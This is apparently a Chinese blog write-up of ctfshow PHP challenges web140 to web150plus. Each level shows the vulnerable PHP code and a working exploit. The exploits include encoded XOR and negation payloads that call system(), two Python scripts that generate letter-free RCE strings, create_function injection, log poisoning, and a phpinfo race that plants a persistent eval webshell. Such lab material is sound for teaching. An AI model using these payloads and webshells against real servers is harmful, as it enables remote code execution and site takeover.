---
title: "PHP 特性 140-150_plus"
date: 2024-10-26
---
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}
```

```
考察： 函数的利用 payload: f1=usleep&f2=usleep

web140
（如果有不对的，还请师傅们帮忙指正~）

解答：根据代码可知，f1和f2必须是字母和数字。if判断是弱等于，需要intval($code)的值为0。

intval() 成功时，返回参数的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。 字符串有可能返回 0，取决于字符串最左侧的字符。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。

所以需要$f1($f2());的返回值，或者是字母开头的字符串，或者是空数组，或者就是0，或者FLASE。

payload1： system(system())---> f1=system&f2=system

string system( string $command[, int &$return_var] )：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system('FLASE')，空指令，失败返回FLASE。

payload2： usleep(usleep())---> f1=usleep&f2=usleep usleep没有返回值。 所以intval参数为空，失败返回0

payload3： getdate(getdate())---> f1=getdate&f2=getdate

array getdate([ int $timestamp = time()] )：返回结果是array，参数必须是int型。所以getdate(getdate())---->getdate(array型)--->失败返回flase，intval为0。

f1=md5&f2=array
f1=sha1&f2=array
f1=fopen&f2=array
f1=filesize&f2=array
```

```php
<?php
#error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

```
考察命令执行和绕过return 应该说运算符都可以绕过 这里用羽师傅给的一个脚本取反命令执行 ?v1=10&v2=0&v3=-(%8c%86%8c%8b%9a%92)(%9c%9e%8b%df%99%d5);

无字母参数构造payloa的脚本：

import os

import re

from urllib.parse import unquote

def make_dic(operation):

filename = f"rce_{operation}.txt"
if not os.path.exists(filename):

    print("Making dictionary...")

    with open(filename, "w") as myfile:
        contents = []
        seen = set()  # 使用集合来跟踪已添加的结果

        # 遍历所有可能的字节值（0-255）
        for i in range(256):
            for j in range(256):
                # 将$i和$j转换为两个字符的十六进制表示
                hex_i = f'{i:02x}'
                hex_j = f'{j:02x}'

                # 正则表达式用于匹配特定字符
                pattern = re.compile(r'[0-9a-z\^\+\~\$\[\]\{\}\&\-]', re.IGNORECASE)

                # 如果十六进制字符转换为二进制后匹配正则表达式，则跳过此循环
                if pattern.match(bytes.fromhex(hex_i).decode('latin1')) or pattern.match(
                        bytes.fromhex(hex_j).decode('latin1')):
                    continue

                # 将十六进制值添加百分号前缀并进行URL解码
                a = f'%{hex_i}'
                b = f'%{hex_j}'
                match operation:
                    case "and":
                        c = chr(ord(unquote(a)) & ord(unquote(b)))
                    case "or":
                        c = chr(ord(unquote(a)) | ord(unquote(b)))
                    case "xor":
                        c = chr(ord(unquote(a)) ^ ord(unquote(b)))

                # 如果解码后的字符是可打印字符（ASCII 32-126），则将其添加到内容列表中
                if 32 <= ord(c) <= 126 and c not in seen:
                    contents.append(f"{c} {a} {b}\n")
                    seen.add(c)  # 将结果添加到集合中

        # 将内容写入文件
        myfile.writelines(contents)
        print("Making dictionary...done")
else:
    print("Dictionary already exists!!")
def generate_payload(text, operation):

op_symbols = {"and": '&', "or": '|', "xor": '^'}
op = op_symbols[operation]
s1 = []
s2 = []
filename = f"rce_{operation}.txt"

with open(filename, 'r') as f:
    lines = f.readlines()

for char in text:
    for line in lines:
        if char == line[0]:
            s1.append(line[2:5])
            s2.append(line[6:].strip())
            break

return f"(\"{''.join(s1)}\"{op}\"{''.join(s2)}\")"
function = input("Please input your function: ")

command = input("Please input your command: ")

while True: operation = input("Please input your operation (and or xor): ") if operation in ["and", "or", "xor"]: break else: print("Please choose one of the following: and, or, xor")

make_dic(operation)

payload = generate_payload(function, operation) + generate_payload(command, operation)

print("Generated payload is :" + payload)
```

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
}

```

```
0和0x0绕过 这里绕过因为是因为当成了8进制和16进制
```

```php
<?php

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

```
位运算都可以进行构造字符 ?v1=10&v2=0&v3=*("%0c%19%0c%5c%60%60"^"%7f%60%7f%28%05%0d") ("%0e%0c%00%00"^"%60%60%20%2a")?>

看了大神的代码，然后写个python版本的，支持异或和或操作

# -*- coding: utf-8 -*-

"""
    @Author disda
    @Date 2023/5/16 10:23
    @Describe 
    @Dependency
    @Version 1.0
"""
# -*- coding: utf-8 -*-

"""
    @Author disda
    @Date 2023/4/26 18:56
    @Describe
    @Dependency
    @Version 1.0
"""
import re
import urllib
from urllib import parse

op_dict = {
    "yes_op": lambda x: x,
    "not_op": lambda x: not x,
    "or_op": lambda x, y: x | y,
    "xor_op": lambda x, y: x ^ y
}

sign = {
    'xor_op': '^',
    'or_op':'|'
}

def generate_coding(file_name, pattern, is_match, mode):
    """
    生成符合要求的编码
    @param file_name: 生成文件的名称
    @param pattern: 正则表达式
    @param is_match: 是否匹配正则，True表示匹配，False表示不匹配
    @param mode: 编码方式
    @return:
    """
    with open(file_name, 'w') as f:
        for i in range(256):
            for j in range(256):
                op = op_dict['not_op'] if is_match else op_dict['yes_op']

                # 如果当前外层循环元素被过滤了，直接跳过所有内层循环
                if op(re.search(pattern, chr(i))):
                    break
                # 如果当前内层循环元素被过滤了，跳过该元素
                if op(re.search(pattern, chr(j))):
                    continue

                # [2:]是因为python中hex表示是0xff这样的形式，去掉前面的0x，组成2位url编码
                hex_i = "0" + hex(i)[2:] if i < 16 else hex(i)[2:]
                hex_j = "0" + hex(j)[2:] if j < 16 else hex(j)[2:]
                # url编码的方式和ASCII码一样，但需要在前面加上%
                url_i = '%' + hex_i
                url_j = '%' + hex_j
                # c是我们要构造的参数，比如说我们要传ls命令，l就要拆分成a|b，其中|是因为题目没有过滤|，我们可以修改成其他任意操作如^
                c = op_dict[mode](ord(urllib.parse.unquote(url_i)), ord(urllib.parse.unquote(url_j)))
                # 如果c是可见的字符
                if c >= 32 and c <= 126:
                    f.write(chr(c) + " " + url_i + " " + url_j + '\n')


def action(arg,file_name,mode):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open(file_name, "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\""+sign[mode]+"\"" + s2 + "\")"
    return (output)

file_name = 'rce.txt'
mode = 'xor_op'
reg = '^\W+$'
generate_coding(file_name,reg,True,mode)
while True:
    param = action(input("\n[+] your function："),file_name,mode) + action(input("[+] your command："),file_name,mode) + ";"
    print(param)

1、使用动态调用函数+异或，避免报错使用-、+、*隔开，异或符号为^(数字6的上面)，异或规则：相同为0，不同为1，比如1^1=0,1^0=1，找到16进制数字，然后用%做URL编码

2、自己算可以，有大神脚本直接出也行 payload： GET：?v1=1&v2=1&v3=(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)
```

```php
<?php


highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

function check($str){
    return strlen($str)===1?true:false;
}
```

```
?v1=10&v2=(%8c%86%8c%8b%9a%92)(%9c%9e%8b%df%99%d5);&v3=-

怎么说呢？我遇到的问题主要是空字节， payload:url/?v1=1&v3=1&v2=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff) 
来自大佬的代码： 
______________________________分割符——————————————————————
 $a = "system"; echo "v1=1&v2=1&v3=("; for ($i = 0; $i < strlen($a); $i++) { echo "%".dechex(ord($a[$i])^0xff); } echo "^"; for ($i = 0; $i < strlen($a); $i++) { echo "%ff"; } echo ")";#(%8b%9e%9c%df%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff) #?v1=1&v2=1&v3=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff) 稍微修改一下，两个（）（）前后依次为(system)(具体命令)
```

```php
<?php

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

```
?v1=%0a1&v2=%0a0&v3=?(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5):
```

```php
<?php

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

```
?v1=1&v2=1&v3=|(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5)|
```

```php
<?php

highlight_file(__FILE__);

if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }

}
```

```
php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法

payload:
GET ?show=;};system('grep flag flag.php');/*
POSOT ctf=%5ccreate_function

web147
解答：（如果有不对的地方，还希望师傅们帮忙指正）

正则匹配绕过，只要ctfshow里有一个不是数字、小写字母和下划线就能绕过。

/i：大小写不敏感匹配

/s：点号元字符匹配所有字符，包含换行符。

/D：元字符美元符号仅仅匹配目标字符串的末尾

php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 调用一个函数时直接写函数名function_name()，相当于是相对路径调用； 如写某一全局函数的完全限定名称\function_name()调用，则是写了一个绝对路径。

在这里插入图片描述

（详情可以看php手册里的命名空间部分）

所以post时ctf可以通过加上\绕过匹配。

找个不需要第一个参数的函数。可以用create_function匿名函数。虽然该函数自PHP 7.2起已经弃用，但是还是可以eval执行函数，只是需要把匿名部分闭合。

get：?show=}system('tac f*');/* post：ctf=%5ccreate_function 在这里插入图片描述

可以这么理解：create_function创建一个匿名函数，我们假设就叫niming。 string create_function( string $args, string $code)那么具体就是如下面所示的样子：

function niming($args,...){
		$code
}
所以就需要}闭合，闭合之后，那就多出来一个}，这就需要用注释符注释掉。
```

```php
<?php

include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
}
```

```
#payload ?code=("%0c%19%0c%5c%60%60"^"%7f%60%7f%28%05%0d") ("%09%01%03%01%06%02"^"%7d%60%60%21%60%28"); 预期解是使用中文 ?code=$哈="{{{"^"?<>/";${$哈}[哼](${$哈}[嗯]);&哼=system&嗯=tac f* "{{{"^"?<>/"; 异或出来的结果是 _GET
```

```php
<?php

error_reporting(0);
highlight_file(__FILE__);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}

file_put_contents($_GET['ctf'], $_POST['show']);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}
```

```
GET: ?ctf=index.php show=

重写index，写个马进去 然后访问index POST:cmd=system('cat /ctfshow_fl0g_here.txt');
```

```php
<?php

include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE){
    include($ctf);
}

```

```
文件包含非预期绕过

这题用extract()函数来进行变量的覆盖来满足if($isVIP && strrpos($ctf, ":")===FALSE)这个条件，get传入ctfshow?isVIP=Ture,再抓包通过向user-agent传入，最后post传入ctf=/var/log/nginx/access.log&a=system('cat flag.php');完工。
```

```php
<?php

include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){
    include($ctf);
}

```

```
这个题一点点小坑__autoload()函数不是类里面的
__autoload — 尝试加载未定义的类
最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦
原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用
__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo
接下来就去getshell啦

exp :https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py

web150plus
解答：php中变量名的点和空格会被转换成下划线。

payload：?..CTFSHOW..=phpinfo 原题说是需要条件竞争，所以flag改为了环境变量。phpinfo后查找即可获得。

在这里插入图片描述

这道题可以联系到web123。那道题里用的是CTF[SHOW.COM解析为CTF_SHOW.COM，是说对不符合规则的变量里只转换一次，变量名中的[也会被替换为_，但其后面的点.就不再进行替换了。

接下来学习一下原题的思路：（不过没做过原题，也不确定思路是不是这个，如果有不对的，还希望能帮忙指正~）

文件包含，在临时文件消失前包含它。

利用phpinfo（具体看一下“进一步学习”的三个链接，特别是第一个链接）。

phpinfo会打印上传临时文件的路径，包含临时文件就可以getshell。

先发送数据包给phpinfo页面，从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。临时文件在第一个请求phpinfo页面渲染加载完毕后会被删除。也就是说如果第一个请求结束，临时文件被删，第二个请求就无法进行包含了。

1）我们需要让phpinfo页面加载的慢一点。

phpinfo页面会将我们post的数据包里的header、get等信息都打印出来，所以我们要把这个数据包的header、get等位置塞满垃圾数据，加大phpinfo加载时间。

php发送数据是分包发送，默认的输出缓冲区大小为4096，即php每次返回4096个字节给socket连接。那么不管返回的信息是第几次，只要读取到的字符里包含临时文件名，就立即发送第二个数据包进行文件包含。

2）此时，发送的第一个数据包的socket连接还没结束，php还在继续每次输出4096个字节，临时文件还没有被删除。这时利用文件包含漏洞就可以成功包含临时文件getshell。

因为这个临时文件终归还是会被删除，所以直接上传是写一句话木马不可行，需要利用短暂的包含写入文件，将一句话木马写到如/tmp/jz，这样就不会被删除了。

<?php file_put_contents('/tmp/jz', '<?php @eval($_REQUEST[jz]);?>');?>
进一步学习：

PHP文件包含漏洞（利用phpinfo）（先看这个，原理详细还有exp）

phpinfo函数_文件包含之通过phpinfo去Getshell@weixin_39528994

文件包含&奇技淫巧@mob604756ebed9f

System：提供服务器所在的操作系统的信息。

$_SERVER['SERVER_ADDR']：真实ip

$_SERVER["CONTEXT_DOCUMENT_ROOT"]：网站根目录

disable_functions：禁用函数

$_FILES：临时文件路径

向phpinfo页面post恶意代码，可以在$_FILES中看到上传的临时文件，如果该网站存在文件包含漏洞，便可以将恶意代码存储我们已知的绝对路径去包含它getshell。
```
